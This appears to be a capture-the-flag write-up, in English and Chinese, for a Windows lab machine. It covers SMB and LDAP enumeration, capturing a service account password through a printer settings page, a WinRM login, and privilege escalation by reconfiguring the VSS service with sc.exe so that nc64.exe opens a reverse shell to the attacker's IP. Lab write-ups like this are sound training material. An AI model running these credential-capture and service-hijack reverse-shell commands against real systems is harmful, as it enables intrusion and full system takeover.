1,Enumeration
port scan (nmap)
80/tcp http
445/tcp smb
check the smb client:
	`crackmapexec smb 10.10.11.108 --shares`

crackmapexec shows that the hostname os PRINTER.return.local, and I need auth to get any additional information from SMB:

Directory Brute Force
`ffuf -u http://10.10.11.108/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

But there is still nothing useful

2,check the website pages
there are a settings page, let's try to find some passwords.

in namp feedback, there is a interesting thing LDAP
	`389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)`
in burpsuite, we get 
![](images/Pasted%20image%2020240722085909.png)
browsers will take POST request to one ip (The other three fields in the form are not even sent. If the page does anything with this input, the user can only change the host (or “ip”), and not the port, username, or password.)

so try to change it to our tun0 ip address and check it.
![](images/Pasted%20image%2020240722090150.png)
we get something really like password and we have known the username:
"svc-printer"
so we can get credits: 
	`svc-printer:1edFg43012!!`

Let's come back to the smb client and try to use this credit to login.
	`crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'`

![](images/Pasted%20image%2020240722090621.png)

Most interestingly, they also work for WinRM:

![](images/Pasted%20image%2020240722090827.png)

So use evil-winrm to connect it.
And we successfully get shell and take the user.txt.

3,Privilege Escalation
enumerate the interesting privileges and groups

![](images/Pasted%20image%2020240722091346.png)


![](images/Pasted%20image%2020240722091325.png)

There may be others of interest, but Server Operators jumps out immediately. This group can do a lot of things:
![](images/Pasted%20image%2020240722092912.png)

This user can modify, start, and stop services, so I’ll abuse this by having it run nc64.exe to give a reverse shell.

sc.exe 是 Windows 服务控制管理工具，它允许用户从命令行管理服务。sc.exe config 命令特别用于配置服务的属性，例如服务的可执行文件路径、启动类型等。

sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234"：这行命令是试图重新配置 vss 服务，使其执行 nc.exe 来创建一个反向 shell，连接到 IP 地址 10.10.14.2 的 1234 端口。

选择利用 vss 服务（Volume Shadow Copy Service）来执行命令是因为 vss 服务通常默认存在于 Windows 系统中，并且可能处于启用状态。利用 vss 服务来执行命令的主要原因如下：

1.默认存在：vss 服务在大多数 Windows 系统中默认存在，并且可能已经处于启用状态，这使其成为一个潜在的目标。
2.高权限：作为一个系统服务，vss 通常以系统权限运行。这意味着如果能够成功修改其可执行文件路径并启动服务，攻击者可以获得高权限执行的能力。
3.隐蔽性：通过修改一个合法的系统服务，攻击者的行为可能更难被立即发现，尤其是在不受信任的网络环境中。

Privilege Escalation 步骤
1.确认权限：确保你有管理员权限，因为更改服务配置需要管理员权限。
2.打开命令提示符：以管理员身份运行命令提示符。
3.运行命令：执行以下命令来修改 vss 服务的可执行文件路径

	sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd 10.10.16.8 443"

	`sc.exe start VSS`

then we can get root shell.

There are better shell:
When the service fails to start in a service way (there are specific requirements for a service binary), then it kills the running process. If I have the service binary actually be cmd.exe, and have that start nc64.exe, then the nc64.exe will continue even after cmd.exe is killed:
当服务无法以服务方式启动时（对服务二进制文件有特定要求），它会终止正在运行的进程。如果我的服务二进制文件实际上是 cmd.exe ，并且启动 nc64.exe ，那么即使在 cmd.exe 被杀死后 nc64.exe 也会继续:

	`sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.16.8 443"`

	`sc.exe start VSS`
 The shell comes back and lives past the timeout:


